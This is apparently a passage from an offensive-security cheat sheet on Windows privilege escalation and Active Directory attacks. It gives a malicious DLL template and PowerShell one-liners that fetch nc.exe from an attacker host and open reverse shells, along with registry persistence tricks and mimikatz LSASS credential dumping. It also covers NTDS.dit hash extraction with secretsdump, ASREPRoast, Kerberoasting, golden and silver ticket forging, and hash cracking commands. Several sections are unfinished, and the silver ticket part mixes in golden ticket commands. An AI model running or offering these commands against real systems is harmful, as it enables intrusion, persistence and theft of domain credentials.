>If an attacker gains control of one of the directories on the DLL search path, it can place a malicious copy of the DLL in that directory. This is sometimes called a DLL preloading attack or a binary planting attack. If the system does not find a legitimate copy of the DLL before it searches the compromised directory, it loads the malicious DLL. If the application is running with administrator privileges, the attacker may succeed in local privilege elevation.”

Here is the order:

1) 32-bit System directory (C:\Windows\System32)
2) 16-bit System directory (C:\Windows\System)
3) Windows directory (C:\Windows)
4) The current working directory (CWD)
5) Directories in the PATH environment variable (system then user)

*Note that services running under SYSTEM does not search through user path environment.*

```bash
icacls C:\Windows\System32
icacls C:\Windows\System
icacls C:\Windows
```

If we have access to **Write** access to those folders, we could replace the .DLL with a malicious one.

There is a tool developped by CyberArk called [DLLSpy](https://github.com/cyberark/DLLSpy) that can detects DLL hijacking in running processes, services and in their binaries.
Note that DLLSpy requires admin privilege.
We can also try by using "Start-Process"

```bash
DLLSpy.exe
Start-Process -PassThru process.exe | Get-Process -Module
```

[dll_hijack_detect](https://github.com/adamkramer/dll_hijack_detect) detects DLL hijacking in running processes on Windows systems
This program will:

1) Iterate through each running process on the system, identifying all the DLLs which they have loaded
2) For each DLL, inspect all the locations where a malicious DLL could be placed
3) If a DLL with the same name appears in multiple locations in the search order, perform an analysis based on which location is currently loaded and highlight the possibility of a hijack to the user

It also check each DLL to see whether it has been digitally signed.
This is because since Windows Vista and Windows Server 2008, new features take advantage of code-signing technologies:

- Administrator privilege is required to install unsigned kernel-mode components (device drivers, filter drivers, services, and so on.)

```bash
.\dll_hijack_detect_x64.exe
```

Here below is the code to create a malicious DLL

```c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 WinExec(PAYLOAD);
 return 0;
}
```

We can either:

- Download nc.exe through HTTP by hosting a Web Server

```bash
# Windows 7 and Windows Server 2008 R2 + newer
powershell -windowstyle hidden Invoke-WebRequest -uri http://OUR_IP/nc.exe -outfile nc.exe & nc.exe OUR_IP OUR_NC_PORT -e powershell.exe
# Older
powershell -windowstyle hidden Invoke-WebRequest -uri http://OUR_IP/nc.exe -outfile nc.exe & nc.exe OUR_IP OUR_NC_PORT -e cmd.exe
```

- Create a SMB server using python-impacket/smbserver.py

```bash
# Create a SMB server using impacket's smbserver.py
python3 /usr/share/python-impacket/smbserver.py temporary /tmp/ -smb2support
```

```powershell
# Windows 7 and Windows Server 2008 R2 + newer
powershell -windowstyle hidden copy \\\\\\\OUR_IP\\\temporary\\\\nc.exe & nc.exe OUR_IP OUR_NC_PORT -e powershell.exe
# Older
powershell -windowstyle hidden copy \\\\\\\OUR_IP\\\temporary\\\\nc.exe & nc.exe OUR_IP OUR_NC_PORT -e cmd.exe
```

#### AppInit DLLs

The AppInit_DLLs infrastructure provides an easy way to hook system APIs by allowing custom DLLs to be loaded into the address space of every interactive application.

Starting in Windows 8, the AppInit_DLLs infrastructure is disabled when secure boot is enabled. This is because *"The AppInit_DLLs mechanism is not a recommended approach for legitimate applications because it can lead to system deadlocks and performance problems."* cc [Microsoft's documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls#summary)

```bash
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecureBoot\State /v UEFISecureBootEnabled
Confirm-SecureBootUEFI (Require privileges)
```

If is it not enabled or the system is inferior as Windows, we can created a malicious DLL.

First, we need to enable LoadAppInit_DLLs

```bash
# 32-bit system
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v "LoadAppInit_DLLs" /t REG_DWORD /d 1 /f
# 64-bit system
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v "LoadAppInit_DLLs" /t REG_DWORD /d 1 /f
```

Registry Key for Arbitrary DLL via AppInit - 32bit and 64bit

```bash
# 32-bit system
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\WindowsAppInit_DLLs
# 64-bit system
HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs
```

To eliminate these issues Didier Stevens developed a DLL which will check the configuration file called "LoadDLLViaAppInit.bl.txt" in order to determine which processes will load the arbitrary DLL.

#### AppCert DLLs

> / / / To Finish

Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs value in the Registry key can be abused to obtain persistence and privilege escalation by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.

Dynamic-link libraries (DLLs) that are specified in the AppCertDLLs Registry key under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\ are loaded into every process that calls the ubiquitously used application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec

```bash
reg query "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls"
```

> / / / To Finish

#### COR_PROFILER

> / / / To Finish

**COR_PROFILER** is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR).

```bash
reg add "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v COR_ENABLE_PROFILING /t REG_DWORD /d 1 /f
reg add "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v COR_PROFILER /t REG_SZ /d 0 /f
reg add "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v COR_PROFILER_PATH /t REG_SZ /d 0 /f
```

### Application Shimming

In order to resolve the problem with legacy applications that are no compatible with newer Windows operating systems, Microsoft creted the Windows Application Compatibility Infrastructure/Framework (Application Shim) so that backward compatibility of software as the operating system codebase changes over time.

This made the application running in backward compatibility mode redirect API calls from Windows itself to alternative code, the shim.

[Here](https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html) is an blogpost by FireEye on how FIN7 used that technique

### Active Directory Attacks

#### Enumeration

Here below are some command to get information about the Active Directory environment

```bash
# Get all the trusted domain objects in the forest.
Get-ADTrust -Filter *
nltest /domain_trusts
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

Within BloodHound, the default collection methods does the Trusts enumeration for you.

##### BloodHound

1) We need to run SharpHound to a machine that is joined to the domain.

```bash
# Collect all data from a given Domain Controller
bloundhound-python -u -p password -ns IP_DC -d victim.local -c ALL
```

This will creates four files called computers.json, domains.json, groups.jso and users.json

The ALL collection method will perform **a lot of queries**, which could trigger the potential SOC.

2) We can use bloodhound

When we put those four files within Bloundhount, we can search for nodes (Active Directory Object)

###### *If you don't know, now you know: [Active Directory Accounts](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts)*

- **Default local accounts**: Built-in accounts that are created automatically when a Windows Server domain controller is installed and the domain is created.
The default local accounts in the Users container include: Administrator, Guest, and KRBTGT.
- **Administrator account**: Default account that is used in all versions of the Windows operating system on every computer and device.
The Administrator account is used by the system administrator for tasks that require administrative credentials.
- **Guest account**: Default local account that has limited access to the computer and is disabled by default.
By default, the Guest account password is **left blank**.
**A blank password** allows the Guest account to be accessed without requiring the user to enter a password.
- **KRBTGT account**: Local default account that acts as a service account for the Key Distribution Center (KDC) service.
This account cannot be deleted, and the account name cannot be changed.

Every Active Directory domain controller is responsible for handling Kerberos ticket requests, which are used to authenticate users and grant them access to computers and applications.

The password for the KDC account is used to derive a secret key for encrypting and decrypting the ticket-granting ticket (TGT) requests that  are used to authenticate users with Kerberos.

|Account Name|SID & RID|
|-|-|
|Administrator account|S-1-5-<domain>-500|
|Guest account|S-1-5-<domain>-501|
|KRBTGT account|S-1-5-<domain>-502|

*Group scopes*

Universal:

- Members
  - Accounts from any domain in the same forest
  - Global and other Universal groups from any domain in the same forest

Global

- Members:
  - Accounts from the same domain
  - Other Global groups from the same domain

Domain Local

- Members:
  - Accounts from any domain or any trusted domain
  - Global groups from any domain or any trusted domain
  - Other Domain Local groups from the same domain
  - Accounts, Global groups, and Universal groups from other forests and from external domains

###### *If you don't know, now you know: [Active Directory Security Groups](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#active-directory-default-security-groups-by-operating-system-version)*

Members of the **Domain Admins** security group are authorized to administer the domain.

Members of the **Administrators** security group have:

- Complete and unrestricted access to the computer.
- If the computer is a domain controller, have unrestricted access to the domain.

Members of the **Group Policy Creators Owners** security group are authorized to create, edit, or delete Group Policy Objects in the domain.

Members of the Schema Admins group can modify the Active Directory schema. 

The Enterprise Admins group exists only in the root domain of an Active Directory forest of domains.

| Active Directory Group |SID & RID|
|-|-|
|Domain Admins|S-1-5-\<domain>-512|
|Administrators| S-1-5-32-544|
|Group Policy Creators Owners|S-1-5-\<domain>-520|
|Schema Admins|S-1-5-\<root domain>-518|
|Enterprise Admins|S-1-5-21-\<root domain>-519|
|Group Policy Creator Owners|S-1-5-\<domain>-520|

###### *If you don't know, now you know: [Domain Trusts](https://docs.microsoft.com/en-us/azure/active-directory-domain-services/concepts-forest-trust)*

A trust is a relationship, which you establish between domains that makes it possible for users in the domain to be authenticated by the other domain.

- **Trust Direction**:
  - *1-way*
  - *2-way*

- **Trust Transitivity**T: Determines whether a trust can be extended outside the two domains between which the trust was formed.
  - *Transitive*: Each time that you create a new domain in a forest, a two-way, transitive trust is automatically created between the new domain and its parent domain.
  - *Nontransitive*: Restricted by the two domains in the trust relationship, which means that it does not flow to any other domains in the forest.

- **Type of trusts**:
  - *Parent and Child*:
    - *Description*: Parent-child is an implicitly established trust when you add a new child domain to a tree.
    - *Transitivity*: Transitive
    - *Direction*: 2-way

  - *Tree-root*:
    - *Description*: Tree-root is an implicitly established trust when you add a new tree root domain to a forest.
    - *Transitivity*: Transitive
    - *Direction*: 2-way

  - *External*:
    - *Description*: Provide access to resources that are located on a domain that is located in a separate forest that is not joined by a forest trust.
    - *Transitivity*: Nontransitive
    - *Direction*: Can be either 1-way or 2-way

  - *Realm*:
    - *Description*: Used to perform relationship between a non-Windows Kerberos realm and an Active Directory domain,
    - *Transitivity*: Can be either transitive or nontransitive
    - *Direction*: Can be either 1-way or 2-way

  - *Forest*:
    - *Description*: Used to share resources between forests
    - *Transitivity*: Transitive
    - *Direction*: Can be either 1-way or 2-way

  - *Shortcut*:
    - *Description*: Used in order to improve user logon times between two domains within an Active Directory forest
    - *Transitivity*: Transitive
    - *Direction*: Can be either 1-way or 2-way

#### ASREPRoast

ASREPRoast takes advantages of users without Kerberos pre-authentication required attribute (DONT_REQ_PREAUTH).
If we perform a AS_REQ request to the DC on behalf of a vulnerable users, we can receive a message which contains a chunk of data encrypted with the original user key, derived from its password.

1) Enumerate vulnerable users
2) Request AS_REP message to the DC on behalf of any of those users, and receive an AS_REP message.

Get-DomainUser -PreauthNotRequired -verbose #List vuln users 
using PowerView

```bash
# Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

# Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

#### Ntds.dit file

> / / / To Finish

```bash
# Confirm the location of the ntds.dit file
reg.exe query hklm\system\currentcontrolset\services\ntds\parameters
```

[impacket-secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) performs various techniques to dump hashes from the remote machine without executing any agent there.

For NTDS.dit we either:

1) Get the domain users list and get its hashes and Kerberos keys using [MS-DRDS] DRSGetNCChanges() call, replicating just the attributes we need.
2) Extract NTDS.dit via vssadmin executed with the smbexec approach. It's copied on the temp dir and parsed remotely.

```bash
# Dump the password hashes (Requires Domain Admin rights on the target domain.)
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>

# If we have the HKLM\System hive (reg.exe save HKLM\SYSTEM) and a copy of the ntds.dit
# -> Offline extraction
secretsdump.py -system system.hive -ntds dit LOCAL
```

If at one point the ntds.dit seems to be corrupted, use [esentutl](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh875546(v=ws.11)) in order to try to repair it

For more information about that technique refer to [T1003.003 - OS Credential Dumping: NTDS](https://attack.mitre.org/techniques/T1003/003/)

###### *If you don't know, now you know: [Ntds.dit](https://www.windowstechno.com/what-is-ntds-dit/)*

The Ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. It includes the password hashes (NTLM) for all users in the domain.

By default, it is located in "C:\Windows\NTDS\"

###### *If you don't know, now you know: [LM-hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)*

LM-hashes is the oldest password storage used by Windows, in the 1980’s.
LM was turned off by default starting in Windows Vista/Server 2008.

Example:
> 299BD128C1101FD6

```bash
john --format=lm hash.txt
hashcat -m 3000 -a 3 hash.txt
```

NTHash (A.K.A. NTLM) is the way passwords are stored on modern Windows systems, and can be obtained by dumping the SAM database.
This is the way passwords are stored on modern Windows systems

Example:
> B4B9B02E6F09A9BD760F388B67351E2B

```bash
john --format=nt hash.txt
hashcat -m 1000 -a 3 hash.txt
```

NTLMv1 (A.K.A. Net-NTLMv1)

The NTLM protocol uses the NTHash in a challenge/response between a server and a client.
The v1 of the protocol uses both the NT and LM hash.

```bash
john --format=netntlm hash.txt
hashcat -m 5500 -a 3 hash.txt
```

NTLMv2 (A.K.A. Net-NTLMv2)

NTLMv2, introduced in Windows NT 4.0 SP4 (1998) with the intend to be cryptographically strengthened replacement for NTLMv1.
Default in Windows since Windows 2000.

> admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030

```bash
john --format=netntlmv2 hash.txt
hashcat -m 5600 -a 3 hash.txt
```

Use of protocol versions:

- **Send LM & NTLM responses**: Clients use LM and NTLM authentication, and never use NTLMv2 session security; DCs accept LM, NTLM, and NTLMv2 authentication.
- **Send LM & NTLM - use NTLMv2 session security if negotiated**: Clients use LM and NTLM authentication, and use NTLMv2 session security if server supports it; DCs accept LM, NTLM, and NTLMv2 authentication.
- **Send NTLM response only**: Clients use NTLM authentication only, and use NTLMv2 session security if server supports it; DCs accept LM, NTLM, and NTLMv2 authentication.
- **Send NTLMv2 response only**: Clients use NTLMv2 authentication only, and use NTLMv2 session security if server supports it; DCs accept LM, NTLM, and NTLMv2 authentication.
- **Send NTLMv2 response only\refuse LM**: Clients use NTLMv2 authentication only, and use NTLMv2 session security if server supports it; DCs refuse LM (accept only NTLM and NTLMv2 authentication).
- **Send NTLMv2 response only\refuse LM & NTLM**: Clients use NTLMv2 authentication only, and use NTLMv2 session security if server supports it; DCs refuse LM and NTLM (accept only NTLMv2 authentication).

#### Silver Tickets

> / / / To Finish

Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account.

Silver Tickets are forged Kerberos **Ticket Granting Service (TGS)** tickets, also called service tickets.
Since a Silver Ticket is a forged TGS, there is **no** communication with a Domain Controller.

In order to create or forge a Silver Ticket, we need has to gain knowledge of the password data (password hash) for the target service. If the target service is running under the context of a user account, then the Service Account’s password hash is required in order to create a Silver Ticket.

"Microsoft added a security check to its implementation of Kerberos known as the Privilege Attribute Certificate (PAC) that requires the TGS to be signed by the KDC using the krbtgt encryption key. However, this check is often disabled in customer environments."

[Kerberoast](https://github.com/nidem/kerberoast) is a series of tools for attacking MS Kerberos implementations.
[Rubeus](https://github.com/GhostPack/Rubeus) is a C# toolset for raw Kerberos interaction
[setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731241(v=ws.11)) reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service account.

Options:

- **T**: Perform query on the specified domain or forest
- **-Q**: Specify which SPNs to look for

```bash
setspn -T victim.local -Q */*
```

```bash
C:\Users\thomas> mimikatz.exe
mimikatz # privilege::debug            # Ask for debug privilege for mimikatz process.
mimikatz # MISC::memssp                # Inject an arbitrary SSP DLL in memory in order to interact with the LSASS process
mimikatz # sekurlsa::logonpasswords    # Gather KRBTGT Password Information
```

Now we need to create the ticket which requires:

- **Domain name (/domain)**: The FQDN
- **SIDs (/sid)**: the SID of the domain
- **Key (/rc4 or /aes128 or /aes256)**: The key we from the *"lsadump::lsa /inject"* command
- **User (user:)**: the username we want to impersonate
- **Service (/service)**: The kerberos service running on the target server.
- **/ptt**: Specify that we will "Pass-The-Ticket" which means that we will impersonate a user on an Active Directiry domain nuy injecting the golden ticket in the current session.
- **RID (/id)** *(optional)*: id of groups the user belongs

The **/service** will depend on our goal

|Service|TGS Needed|Access|
|-|-|-|
|WMI|HOST & RPCSS|Remotely execute commands
|Remote PowerShell|HOST & HTTP|WinRM and/or remote PowerShell
|WinRM|HOST & HTTP|WinRM and/or remote PowerShell
|Scheduled Tasks|HOST|Get admin rights on any any Windows service covered by "host"|
|Windows File Share (CIFS)|CIFS|Access any shares and copy files to or from the share|
|LDAP Operations|LDAP|Admin rights to LDAP services

```bash
# Creating and injecting the Golden Ticket
mimikatz # kerberos::golden /domain:victim.local /sid:S-1-5-21-7777777777-7777777777-7777777777 /rc4:7777777777777777777777777777777 /user:newAdmin /ptt
```

We can verify that the cached ticket is there by using [klist](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/klist) which is a native command of Windows used to display a list of currently cached Kerberos tickets.

```bash
klist
```

If the user is set to use AES, we may need to try to downgrade towards RC4 by doing the following on the infected machine
This is done by using the **/tgtdeleg** option which says that accounts with AES enabled will have RC4 tickets requested.

```bash
# All user accounts with SPNs set in the current domain are Kerberoasted
Rubeus.exe kerberoast /tgtdeleg
```

For more information about that technique refer to [T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting](https://attack.mitre.org/techniques/T1558/003/)

Kerberoasting stand for extracting service account credential hashes from Active Directory for offline cracking.

Note that a SIEM or Security Analysts may detect the fact that we are requesting an RC4 instead of AES.

For more information about that technique refer to [T1558.002 - Steal or Forge Kerberos Tickets: Silver Ticket](https://attack.mitre.org/techniques/T1558/002/)

### Golden Ticket

> / / / To Finish

The golden ticket technique is a technique where starts by extracting the password from the KRBTGT account on an Active Directory Domain Controller we have access to. Then we create a **Ticket Granting Ticket (TGT)** ticket that has Domain Admin rights.

1) Get access to a domain controller
2) Extract the KRBTGT account password hash as well as the domain SID information
3) Create the golden ticket

For this, we will use [mimikatz](https://github.com/gentilkiwi/mimikatz) which is considered to be the "Swiss army knife" of Windows credentials

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe"
```

Note that the LSA Protection could be enabled, in order to bypass this, we need to inject a fake driver signed by Microsoft

```bash
C:\Users\thomas> mimikatz.exe
mimikatz # privilege::debug                   # Ask for debug privilege for mimikatz process.
mimikatz # MISC::memssp                       # Inject an arbitrary SSP DLL in memory in order to interact with the LSASS process
mimikatz # lsadump::lsa /inject /name:krbtgt  # Gather KRBTGT Password Information
```

Now we need to create the ticket which requires (same as in the Silver Attack, except that we don't need the service)

For more information about that technique refer to [T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket^](https://attack.mitre.org/techniques/T1558/001/)

###### *If you don't know, now you know : [LSA Protection](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn408187(v=ws.11)?redirectedfrom=MSDN)*

Starting by Windows 8,1 and Windows Server 2012 R2, the Windows 8.1 operating system provides additional protection for the LSA to prevent reading memory and code injection by non-protected processes.

The LSA Protection focus on ensuring that all of the LSA plug-ins are digitally signed with a Microsoft certificate.

###### *If you don't know, now you know : [Security Support Provider Interface](https://docs.microsoft.com/en-us/windows/win32/rpc/security-support-provider-interface-sspi-)*

Security Support Provider Interface is a security method to add security within distributed application.
Beginning with Windows 2000, RPC supports a variety of security providers and packages which includes:

- **Kerberos Protocol Security Package**: Kerberos v5 protocol is an industry-standard security package. It uses fullsic principal names.
- **SCHANNEL SSP**: This SSP implements the Microsoft Unified Protocol Provider security package, which unifies SSL, private communication technology (PCT), and transport level security (TLS) into one security package. It recognizes msstd and fullsic principal names.
- **NTLM Security Package**: This was the primary security package for NTLM networks prior to Windows 2000.

#### References

- For the privileges part, thanks to @[decoder-it](https://github.com/decoder-it), his talk "[HIP19: whoami priv - show me your privileges and I will lead you to SYSTEM"](https://www.youtube.com/watch?v=ur2HPyuQlEU)" is a must see
- For the "CLI Enumeration" part, thanks to FuzzySecurity <https://www.fuzzysecurity.com/tutorials/16.html>
- For the "AccessChk" Deep Dive, thanks to Mark Russinovich & Bryce Cogswell
 <http://mirrors.arcadecontrols.com/www.sysinternals.com/Blog/index.html>
- For the "LM & More" thanks to Péter Gombos <https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4>
- For the "Domain Trusts" part, thank to Girit Haran <https://giritharan.com/active-directory-domains-and-trust/>
- For the "AppInit DLLs" part, thanks to <https://pentestlab.blog/2020/01/07/persistence-appinit-dlls/>
- For the "Scheduled Tasks" part, thanks to <https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/>

#### Source Todo

http://mysoftwarelab.blogspot.com/2010/12/localservice-vs-networkservice-vs.html
http://carnal0wnage.attackresearch.com/2007/08/more-of-using-rpcclient-to-find.html
https://book.hacktricks.xyz/windows/active-directory-methodology/asreproast
https://www.jaiminton.com/cheatsheet/DFIR/#pagefile-information

- DPAPI: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
- AppCmd.exe: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
- SSH keys in registry: https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#windows-vault